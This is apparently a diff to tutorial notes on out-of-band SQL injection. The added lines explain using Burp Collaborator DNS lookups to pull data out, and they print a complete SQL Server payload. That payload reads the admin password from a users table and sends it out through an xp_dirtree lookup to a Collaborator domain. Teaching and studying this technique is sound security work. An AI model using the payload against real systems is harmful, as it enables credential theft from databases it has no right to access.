@@ -10,3 +10,7 @@
 * Ths input prompts the database to perform a DNS lookup for the domain:
 * `32rf2f2f829f29fh29f2hf29fh2ay.burpcollaborator.net`
 * Burp Collaborator can then generate a unique subdomain, and by polling the Collaborator server, we can confirm when DNS lookups occur.
+* Having identified a method to trigger out-of-band interactions, they can then utilize this channel to exfiltrate data from the vulnerable application.
+* **For example**: 
+#### `'; declare @s varchar(1024);set @s=(SELECT password FROM users WHERE username='admin');exec('master..xp_dirtree"//'+@s'+.32rf2f2f829f29fh29f2hf29fh2ay.burpcollaborator.net/a"'--`
+* This input retrieves the password for the Administrator user, appends a unique Collaborator subdomain, and initiates a DNS lookup.
